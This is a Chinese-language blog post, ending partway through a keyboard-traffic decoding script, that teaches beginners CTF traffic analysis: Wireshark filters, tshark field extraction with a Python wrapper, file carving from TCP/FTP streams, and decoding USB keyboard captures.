

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="chaye">
  <meta name="keywords" content="">
  
    <meta name="description" content="Misc-流量分析CTF-Misc 入门指南——流量分析系列">
<meta property="og:type" content="article">
<meta property="og:title" content="流量分析基础">
<meta property="og:url" content="http://example.com/2025/01/19/MISC/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="chaye的博客">
<meta property="og:description" content="Misc-流量分析CTF-Misc 入门指南——流量分析系列">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/imgs/N1.png">
<meta property="og:image" content="http://example.com/imgs/image-20250419164405745.png">
<meta property="og:image" content="http://example.com/imgs/image-20250515121809838.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226141615204.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226141953586.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226142116762.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226142501601.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226142239379.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226142441765.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226142732540.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226143409529.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226143429376.png">
<meta property="og:image" content="http://example.com/imgs/image-20250424172707884.png">
<meta property="og:image" content="http://example.com/imgs/image-20250419164124175.png">
<meta property="og:image" content="http://example.com/imgs/f4413f003bad201ef52b84974e4a5bdb.png">
<meta property="og:image" content="http://example.com/imgs/040733479f1ea54a0871282953df365a.png">
<meta property="og:image" content="http://example.com/imgs/N3.png">
<meta property="og:image" content="http://example.com/imgs/N4.png">
<meta property="og:image" content="http://example.com/imgs/N5.png">
<meta property="og:image" content="http://example.com/imgs/image-20250515121850746.png">
<meta property="og:image" content="http://example.com/imgs/image-20250515121856215.png">
<meta property="og:image" content="http://example.com/imgs/%E5%9B%BE%E7%89%87.webp">
<meta property="og:image" content="http://example.com/imgs/N6.png">
<meta property="og:image" content="http://example.com/imgs/image-20251105142610867.png">
<meta property="og:image" content="http://example.com/imgs/image-20251105142832603.png">
<meta property="og:image" content="http://example.com/imgs/image-20251105142512436.png">
<meta property="og:image" content="http://example.com/imgs/image-20251105145452260.png">
<meta property="og:image" content="http://example.com/imgs/image-20251105145456622.png">
<meta property="og:image" content="http://example.com/imgs/image-20251105143329850.png">
<meta property="og:image" content="http://example.com/imgs/image-20240430142133329.png">
<meta property="og:image" content="http://example.com/imgs/image-20240430111822297.png">
<meta property="og:image" content="http://example.com/imgs/image-20240430112312109.png">
<meta property="og:image" content="http://example.com/imgs/image-20240430112740044.png">
<meta property="og:image" content="http://example.com/imgs/image-20240430112936680.png">
<meta property="og:image" content="http://example.com/imgs/image-20240430113016466.png">
<meta property="og:image" content="http://example.com/imgs/image-20240430135813366.png">
<meta property="og:image" content="http://example.com/imgs/image-20240430135958048.png">
<meta property="og:image" content="http://example.com/imgs/image-20241202135717254.png">
<meta property="og:image" content="http://example.com/imgs/image-20241202140503314.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226232852559.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226233215942.png">
<meta property="og:image" content="http://example.com/imgs/image-20250226233503658.png">
<meta property="og:image" content="http://example.com/imgs/image-20241202141020218.png">
<meta property="og:image" content="http://example.com/imgs/image-20241120165643159.png">
<meta property="og:image" content="http://example.com/imgs/N7.png">
<meta property="og:image" content="http://example.com/imgs/N8.png">
<meta property="og:image" content="http://example.com/imgs/N9.png">
<meta property="og:image" content="http://example.com/imgs/image-20250302192720139.png">
<meta property="og:image" content="http://example.com/imgs/N10.png">
<meta property="article:published_time" content="2025-01-19T05:56:47.000Z">
<meta property="article:modified_time" content="2026-01-19T07:08:35.293Z">
<meta property="article:author" content="chaye">
<meta property="article:tag" content="流量分析">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="http://example.com/imgs/N1.png">
  
  
  
  <title>流量分析基础 - chaye的博客</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>chaye</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="流量分析基础"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-01-19 13:56" pubdate>
          January 19, 2025 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          20k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          167 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">流量分析基础</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="Misc-流量分析"><a href="#Misc-流量分析" class="headerlink" title="Misc-流量分析"></a>Misc-流量分析</h1><p><strong>CTF-Misc 入门指南——流量分析系列</strong> </p>
<span id="more"></span>
<p>拿到流量包后，第一件事就是可以先 <code>strings | grep flag&#123;</code> 一下，说不定 flag 就直接出了</p>
<p>当然也可以使用<code>@凤二西</code>师傅的 <code>破空_flag查找工具3.5.exe</code> 来搜索 flag</p>
<h2 id="WireShark基础"><a href="#WireShark基础" class="headerlink" title="WireShark基础"></a>WireShark基础</h2><p>刚刚接触流量分析的同学，看到<code>Wireshark</code>中密密麻麻的流量包和字段可能会感觉无从下手</p>
<p>但是其实我们要明白一点就是，流量分析的第一步就是过滤，把流量包过滤到我们能掌控的范围内，然后再逐个分析</p>
<p><code>wireshark</code>的过滤器其实上手很简单，用熟悉了以后会给人一种非常顺手的感觉</p>
<p>常见的协议比如<code>http</code>，常用的有下面这些参数，其实只要在过滤器中输入<code>htt</code>. 它就会自动提示你后面的字段了</p>
<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">http.request.method == <span class="hljs-string">&quot;<span class="hljs-keyword">POST</span>&quot;</span><br>http.request.full_uri == “XXX”<br>......<br></code></pre></td></tr></table></figure>

<p>除了协议以外，还有一些比较常用的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 包含什么内容的帧</span><br>frame contains <span class="hljs-string">&quot;XXX&quot;</span><br></code></pre></td></tr></table></figure>

<p>其实这里可以直接右击想要过滤的字段，然后作为过滤器选中，上面就会自己跳出来过滤的表达式了（这里也可以使用或选中和且选中）</p>
<p>有了这个表达式，就可以带入下面的 tshark 命令一键提取所有过滤出来的帧的指定字段的数据了</p>
<p><img src="/imgs/N1.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="tshark使用教程"><a href="#tshark使用教程" class="headerlink" title="tshark使用教程"></a>tshark使用教程</h2><p>导出流量包中所有POST数据包的data数据</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r 1.pcapng -Y <span class="hljs-string">&quot;http.request.method == POST&quot;</span> -T fields -e data.data &gt; data.txt<br><span class="hljs-comment"># -r：指定了需要读取的文件</span><br><span class="hljs-comment"># -Y：使用过滤器</span><br><span class="hljs-comment"># -T：表示仅仅输出所选字段</span><br><span class="hljs-comment"># -e：指定提取的字段</span><br></code></pre></td></tr></table></figure>

<p>以下两个命令是Linux中的命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># uinq：去除重复行</span><br><span class="hljs-comment"># sed &#x27;/^\s*$/d&#x27;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）</span><br></code></pre></td></tr></table></figure>

<p>在我们清楚了tshark的相关命令后，我们就可以尝试编写Python脚本来调用tshark进行流量包的处理了</p>
<p>这种用法通常在我们分析较大流量包并且需要频繁复制里面的数据的时候比较实用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> subprocess<br><br>output = <span class="hljs-string">&quot;&quot;</span><br>file_path = <span class="hljs-string">&quot;&quot;</span> <span class="hljs-comment"># 流量包的路径</span><br>command = [<br>	<span class="hljs-string">&quot;tshark&quot;</span>,  <span class="hljs-comment"># tshark的路径，如果在环境变量里这里就不用改</span><br>	<span class="hljs-string">&#x27;-r&#x27;</span>, file_path,  <span class="hljs-comment"># 读取指定的 pcapng 文件</span><br>	<span class="hljs-string">&#x27;-Y&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>,  <span class="hljs-comment"># 过滤出 HTTP 数据包</span><br>	<span class="hljs-string">&#x27;-T&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>,  <span class="hljs-comment"># 输出为 JSON 格式</span><br>	<span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;http.request.method&#x27;</span>,  <span class="hljs-comment"># 请求方法</span><br>	<span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;http.host&#x27;</span>,  <span class="hljs-comment"># 请求主机</span><br>	<span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;http.request.uri&#x27;</span>,  <span class="hljs-comment"># 请求 URI</span><br>	<span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;http.user_agent&#x27;</span>,  <span class="hljs-comment"># 用户代理</span><br>	<span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;http.file_data&#x27;</span>,  <span class="hljs-comment"># 请求中的文件数据（POST 请求的内容）</span><br>	<span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;http.response.code&#x27;</span>,  <span class="hljs-comment"># 响应代码</span><br>	<span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;http.response.phrase&#x27;</span>,  <span class="hljs-comment"># 响应短语</span><br>	<span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;http.content_type&#x27;</span>  <span class="hljs-comment"># 响应内容类型</span><br>]<br>result = subprocess.run(<br>    command, check=<span class="hljs-literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="hljs-literal">True</span>)<br>json_output = json.loads(result.stdout)<br><span class="hljs-comment"># print(json.dumps(json_output, indent=4))  # 这个输出是用来调试的，可以移除</span><br><br><span class="hljs-comment"># 遍历 JSON 数据并提取字段</span><br><span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> json_output:<br>    layers = packet.get(<span class="hljs-string">&#x27;_source&#x27;</span>, &#123;&#125;).get(<span class="hljs-string">&#x27;layers&#x27;</span>, &#123;&#125;)<br>    request_method = layers.get(<span class="hljs-string">&#x27;http.request.method&#x27;</span>, [<span class="hljs-string">&#x27;None&#x27;</span>])[<span class="hljs-number">0</span>]<br>    request_host = layers.get(<span class="hljs-string">&#x27;http.host&#x27;</span>, [<span class="hljs-string">&#x27;None&#x27;</span>])[<span class="hljs-number">0</span>]<br>    request_uri = layers.get(<span class="hljs-string">&#x27;http.request.uri&#x27;</span>, [<span class="hljs-string">&#x27;None&#x27;</span>])[<span class="hljs-number">0</span>]<br>    user_agent = layers.get(<span class="hljs-string">&#x27;http.user_agent&#x27;</span>, [<span class="hljs-string">&#x27;None&#x27;</span>])[<span class="hljs-number">0</span>]<br>    file_data = layers.get(<span class="hljs-string">&#x27;http.file_data&#x27;</span>, [<span class="hljs-string">&#x27;None&#x27;</span>])[<span class="hljs-number">0</span>]<br>    response_code = layers.get(<span class="hljs-string">&#x27;http.response.code&#x27;</span>, [<span class="hljs-string">&#x27;None&#x27;</span>])[<span class="hljs-number">0</span>]<br>    response_phrase = layers.get(<span class="hljs-string">&#x27;http.response.phrase&#x27;</span>, [<span class="hljs-string">&#x27;None&#x27;</span>])[<span class="hljs-number">0</span>]<br>    content_type = layers.get(<span class="hljs-string">&#x27;http.content_type&#x27;</span>, [<span class="hljs-string">&#x27;None&#x27;</span>])[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure>

<h2 id="流量分析基础考点"><a href="#流量分析基础考点" class="headerlink" title="流量分析基础考点"></a>流量分析基础考点</h2><h3 id="1、直接搜索flag明文或者编码过的flag"><a href="#1、直接搜索flag明文或者编码过的flag" class="headerlink" title="1、直接搜索flag明文或者编码过的flag:"></a>1、直接搜索flag明文或者编码过的flag:</h3><h3 id="2、流量包端口隐写（可能会有01互换）"><a href="#2、流量包端口隐写（可能会有01互换）" class="headerlink" title="2、流量包端口隐写（可能会有01互换）"></a>2、流量包端口隐写（可能会有01互换）</h3><h3 id="3、TCP-FTP协议传输文件-binwalk和foremost都没用-："><a href="#3、TCP-FTP协议传输文件-binwalk和foremost都没用-：" class="headerlink" title="3、TCP&#x2F;FTP协议传输文件(binwalk和foremost都没用)："></a>3、TCP&#x2F;FTP协议传输文件(binwalk和foremost都没用)：</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 直接用wireshark导出为pcap文件然后用networkminer分析<br><span class="hljs-bullet">2.</span> 拉入kali用tcpxtract提取文件：tcpxtract -f +文件名.pcap<br><span class="hljs-bullet">3.</span> 直接追踪流提取16进制，根据文件头尾提取出文件<br></code></pre></td></tr></table></figure>

<h3 id="4、有时候可能需要根据IP或者版本分类导出"><a href="#4、有时候可能需要根据IP或者版本分类导出" class="headerlink" title="4、有时候可能需要根据IP或者版本分类导出"></a>4、有时候可能需要根据IP或者版本分类导出</h3><h2 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h2><p>常见的类型有鼠标流量和键盘流量，当然有时候还会出现数位板这种设备的流量</p>
<p>流量包中数据存储的字段有两种：<code>usb.capdata</code> 和 <code>usbhid.data</code></p>
<h3 id="键盘流量分析"><a href="#键盘流量分析" class="headerlink" title="键盘流量分析"></a>键盘流量分析</h3><blockquote>
<p>键盘流量的数据常见的长度为8字节</p>
</blockquote>
<p>首先根据数据存储的字段，用<code>tshark</code>提取出数据，注意在有多个IP的情况下要用过滤器分IP提取</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r example.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; data.txt<br>tshark -r example.pcapng -T fields -e usbhid.data | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; data.txt<br><br>tshark -r example.pcapng -Y <span class="hljs-string">&#x27;usb.src == &quot;2.3.1&quot;&#x27;</span> -T fields -e usbhid.data | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; data.txt<br><span class="hljs-comment"># -r：指定了需要读取的文件</span><br><span class="hljs-comment"># -Y：使用过滤器</span><br><span class="hljs-comment"># -T：表示仅仅输出所选字段</span><br><span class="hljs-comment"># -e：指定提取的字段</span><br><span class="hljs-comment"># sed &#x27;/^\s*$/d&#x27;：在sed中使用正则表达式过滤掉所有空行（其中 ^\s*$ 匹配空行，d 表示删除）</span><br></code></pre></td></tr></table></figure>

<p>然后使用脚本根据对照表还原出键盘输入的数据即可</p>
<blockquote>
<p>Tips:网上的教程都是告诉大家需要对数据先添加冒号，但是现在新版的tshark很多情况下提取出来的数据是不带冒号的</p>
<p>因此我个人觉得这里没必要多此一举，我们还是要与时俱进，简单改一下网上的脚本就行</p>
<p>这里就贴一份的自己写的还原脚本吧</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>: <span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>: <span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>: <span class="hljs-string">&quot;i&quot;</span>,<br>              <span class="hljs-string">&quot;0d&quot;</span>: <span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>: <span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>: <span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>: <span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>: <span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>: <span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>: <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>: <span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>: <span class="hljs-string">&quot;r&quot;</span>,<br>              <span class="hljs-string">&quot;16&quot;</span>: <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>: <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>: <span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>: <span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>: <span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>: <span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>: <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>: <span class="hljs-string">&quot;z&quot;</span>, <span class="hljs-string">&quot;1e&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,<br>              <span class="hljs-string">&quot;1f&quot;</span>: <span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>: <span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>: <span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>: <span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>: <span class="hljs-string">&quot;6&quot;</span>, <span class="hljs-string">&quot;24&quot;</span>: <span class="hljs-string">&quot;7&quot;</span>, <span class="hljs-string">&quot;25&quot;</span>: <span class="hljs-string">&quot;8&quot;</span>, <span class="hljs-string">&quot;26&quot;</span>: <span class="hljs-string">&quot;9&quot;</span>, <span class="hljs-string">&quot;27&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>              <span class="hljs-string">&quot;28&quot;</span>: <span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>, <span class="hljs-string">&quot;29&quot;</span>: <span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>, <span class="hljs-string">&quot;2a&quot;</span>: <span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>: <span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&quot;2c&quot;</span>: <span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>, <span class="hljs-string">&quot;2d&quot;</span>: <span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;2e&quot;</span>: <span class="hljs-string">&quot;=&quot;</span>, <span class="hljs-string">&quot;2f&quot;</span>: <span class="hljs-string">&quot;[&quot;</span>,<br>              <span class="hljs-string">&quot;30&quot;</span>: <span class="hljs-string">&quot;]&quot;</span>, <span class="hljs-string">&quot;31&quot;</span>: <span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;32&quot;</span>: <span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>, <span class="hljs-string">&quot;33&quot;</span>: <span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&quot;34&quot;</span>: <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;35&quot;</span>: <span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>, <span class="hljs-string">&quot;36&quot;</span>: <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;37&quot;</span>: <span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;38&quot;</span>: <span class="hljs-string">&quot;/&quot;</span>,<br>              <span class="hljs-string">&quot;39&quot;</span>: <span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>, <span class="hljs-string">&quot;3a&quot;</span>: <span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>, <span class="hljs-string">&quot;3b&quot;</span>: <span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>: <span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>, <span class="hljs-string">&quot;3d&quot;</span>: <span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>, <span class="hljs-string">&quot;3e&quot;</span>: <span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>, <span class="hljs-string">&quot;3f&quot;</span>: <span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;40&quot;</span>: <span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>, <span class="hljs-string">&quot;41&quot;</span>: <span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>, <span class="hljs-string">&quot;42&quot;</span>: <span 